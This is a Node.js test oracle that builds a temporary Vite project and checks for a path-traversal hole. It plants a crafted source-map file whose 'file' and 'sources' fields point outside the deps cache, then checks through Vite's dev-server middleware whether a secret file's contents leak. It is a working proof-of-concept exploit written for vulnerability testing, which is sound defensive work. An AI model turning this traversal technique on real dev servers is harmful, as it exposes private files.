'use strict';
const path = require('node:path');
const fs = require('node:fs');
const os = require('node:os');

function finish(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

function makeFakeReqRes(urlPath) {
  const { EventEmitter } = require('node:events');
  const req = new EventEmitter();
  req.url = urlPath;
  req.originalUrl = urlPath;
  req.method = 'GET';
  req.headers = { host: 'localhost:5173' };
  req.httpVersion = '1.1';
  req.socket = { remoteAddress: '127.0.0.1' };

  const res = new EventEmitter();
  res.statusCode = 200;
  res._headers = {};
  res._body = Buffer.alloc(0);
  res._ended = false;
  res.setHeader = function (k, v) { res._headers[k] = v; };
  res.getHeader = function (k) { return res._headers[k]; };
  res.removeHeader = function () {};
  res.hasHeader = function (k) { return Object.prototype.hasOwnProperty.call(res._headers, k); };
  res.writeHead = function (code, headers) {
    res.statusCode = code;
    if (headers) {
      for (const k of Object.keys(headers)) res._headers[k] = headers[k];
    }
  };
  res.write = function (chunk) {
    if (chunk) {
      const buf = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
      res._body = Buffer.concat([res._body, buf]);
    }
    return true;
  };
  res.end = function (chunk) {
    if (chunk) res.write(chunk);
    res._ended = true;
    res.emit('finish');
  };
  return { req, res };
}

async function dispatch(middlewares, req, res, timeoutMs) {
  return new Promise((resolve, reject) => {
    let settled = false;
    const timer = setTimeout(() => {
      if (!settled) {
        settled = true;
        resolve({ timedOut: true });
      }
    }, timeoutMs);

    res.on('finish', () => {
      if (!settled) {
        settled = true;
        clearTimeout(timer);
        resolve({ timedOut: false });
      }
    });

    try {
      middlewares.handle(req, res, (err) => {
        if (!settled) {
          settled = true;
          clearTimeout(timer);
          if (err) reject(err);
          else resolve({ timedOut: false, fellThrough: true });
        }
      });
    } catch (e) {
      if (!settled) {
        settled = true;
        clearTimeout(timer);
        reject(e);
      }
    }
  });
}

async function main() {
  let viteMod;
  try {
    viteMod = require('vite');
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'module resolution failed: ' + String(e && e.message) });
    return;
  }

  if (typeof viteMod.createServer !== 'function') {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'createServer not exported' });
    return;
  }

  const marker = 'vite_oracle_' + Date.now() + '_' + Math.random().toString(36).slice(2);
  const secretMarkerContent = 'SECRET_CONTENT_SHOULD_NOT_BE_READABLE_' + marker;
  const base = path.join(os.tmpdir(), marker);
  const projectRoot = path.join(base, 'project');
  const depsDir = path.join(projectRoot, 'node_modules', '.vite', 'deps');
  const secretDir = path.join(base, 'secret_outside');

  let server = null;

  try {
    fs.mkdirSync(depsDir, { recursive: true });
    fs.mkdirSync(secretDir, { recursive: true });

    // Legitimate chunk + its legitimate, well-formed source map (benign case).
    fs.writeFileSync(path.join(depsDir, 'chunk-ABC123.js'), '// benign optimized dep chunk\nexport default {};\n//# sourceMappingURL=chunk-ABC123.js.map\n');
    fs.writeFileSync(
      path.join(depsDir, 'chunk-ABC123.js.map'),
      JSON.stringify({ version: 3, sources: ['chunk-ABC123.js'], sourcesContent: ['// src'], names: [], mappings: '', file: 'chunk-ABC123.js' })
    );

    // Secret file placed well outside the deps cache dir.
    fs.writeFileSync(path.join(secretDir, 'etc_passwd_like_secret.map'), secretMarkerContent);

    // Malicious chunk whose accompanying .map file's "file" field is a traversal path
    // pointing at the secret file. The vulnerable optimized-deps middleware resolves this
    // "file" field relative to the deps dir without validating containment.
    const relTraversal = path.relative(depsDir, path.join(secretDir, 'etc_passwd_like_secret.map'));
    fs.writeFileSync(path.join(depsDir, 'chunk-EVIL999.js'), '// malicious optimized dep chunk\nexport default {};\n//# sourceMappingURL=chunk-EVIL999.js.map\n');
    fs.writeFileSync(
      path.join(depsDir, 'chunk-EVIL999.js.map'),
      JSON.stringify({ version: 3, sources: [relTraversal], sourcesContent: [null], names: [], mappings: '', file: relTraversal })
    );

    fs.writeFileSync(path.join(projectRoot, 'package.json'), JSON.stringify({ name: 'fixture-project', version: '0.0.0' }));
    fs.mkdirSync(path.join(projectRoot, 'public'), { recursive: true });
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'fixture setup failed: ' + String(e && e.message) });
    return;
  }

  try {
    server = await viteMod.createServer({
      root: projectRoot,
      configFile: false,
      logLevel: 'silent',
      clearScreen: false,
      server: {
        middlewareMode: true,
        hmr: false,
        watch: null,
        fs: { strict: true }
      },
      optimizeDeps: {
        noDiscovery: true
      },
      cacheDir: path.join(projectRoot, 'node_modules', '.vite')
    });
  } catch (e) {
    finish({ operation_completed: false, exploit_succeeded: false, evidence: 'createServer failed: ' + String(e && e.message) });
    return;
  }

  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const middlewares = server.middlewares;
    if (!middlewares || typeof middlewares.handle !== 'function') {
      throw new Error('middlewares.handle not available');
    }

    // Benign request: fetch the legitimate existing .map file via the dev server's own
    // optimized-deps middleware. This proves the handler path works normally.
    const benignUrl = '/node_modules/.vite/deps/chunk-ABC123.js.map';
    const { req: benignReq, res: benignRes } = makeFakeReqRes(benignUrl);
    const benignOutcome = await dispatch(middlewares, benignReq, benignRes, 5000);

    const benignBodyStr = benignRes._body.toString('utf8');
    const benignOk = benignRes.statusCode === 200 && benignBodyStr.indexOf('"version"') !== -1 && benignBodyStr.indexOf('chunk-ABC123.js') !== -1;

    if (benignOutcome.timedOut || !benignOk) {
      finish({ operation_completed: false, exploit_succeeded: false, evidence: 'benign request failed: status=' + benignRes.statusCode + ' timedOut=' + benignOutcome.timedOut + ' bodyLen=' + benignBodyStr.length + ' body=' + benignBodyStr.slice(0, 200) });
      try { await server.close(); } catch (e) {}
      return;
    }

    operation_completed = true;

    // Malicious request: request the .map for the malicious chunk. The vulnerable middleware
    // reads the .map JSON, extracts the embedded "file"/"sources" path (attacker controlled via
    // the fixture .map content, simulating a crafted dependency / cache poisoning scenario),
    // and serves that resolved file's content without validating it stays within depsDir.
    const maliciousUrl = '/node_modules/.vite/deps/chunk-EVIL999.js.map';
    const { req: malReq, res: malRes } = makeFakeReqRes(maliciousUrl);
    let malOutcome;
    try {
      malOutcome = await dispatch(middlewares, malReq, malRes, 5000);
    } catch (e) {
      finish({ operation_completed: true, exploit_succeeded: false, evidence: 'malicious request threw (treated as blocked): ' + String(e && e.message) });
      try { await server.close(); } catch (e2) {}
      return;
    }

    const malBodyStr = malRes._body.toString('utf8');
    const leaked = malBodyStr.indexOf(secretMarkerContent) !== -1;
    const statusIsSuccess = malRes.statusCode >= 200 && malRes.statusCode < 300;

    exploit_succeeded = !malOutcome.timedOut && statusIsSuccess && leaked;

    evidence = 'depsDir=' + depsDir +
      ' maliciousUrl=' + maliciousUrl +
      ' malStatus=' + malRes.statusCode +
      ' malBodyLen=' + malBodyStr.length +
      ' leaked=' + leaked +
      ' timedOut=' + malOutcome.timedOut;

    finish({ operation_completed, exploit_succeeded, evidence });
  } catch (e) {
    finish({ operation_completed: operation_completed, exploit_succeeded: false, evidence: 'unexpected error: ' + String(e && e.message) });
  } finally {
    try {
      if (server) await server.close();
    } catch (e) {}
  }
}

main();
